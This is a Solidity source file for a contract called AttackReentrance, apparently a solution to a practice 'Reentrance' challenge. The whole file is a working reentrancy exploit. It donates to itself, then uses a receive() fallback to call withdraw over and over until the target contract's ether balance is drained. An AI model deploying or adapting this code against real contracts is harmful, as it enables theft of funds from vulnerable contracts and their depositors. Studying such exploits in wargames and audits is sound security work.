

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackReentrance {
    IReentrance public reentrance;
    uint256 initialDeposit;
    
    constructor(address _reentranceAddress) public {
        reentrance = IReentrance(_reentranceAddress);
    }
    
    function attack() external payable {
        require(msg.value > 0, "Send ETH to start the attack");
        initialDeposit = msg.value;
        
        // First, donate to ourselves to establish a balance
        reentrance.donate{value: msg.value}(address(this));
        
        // Then start the withdrawal loop
        withdraw();
    }
    
    function withdraw() private {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance > 0) {
            uint256 amount = initialDeposit < targetBalance ? 
                            initialDeposit : targetBalance;
            reentrance.withdraw(amount);
        }
    }
    
    // Fallback function that gets called when receiving ETH
    receive() external payable {
        withdraw();
    }
}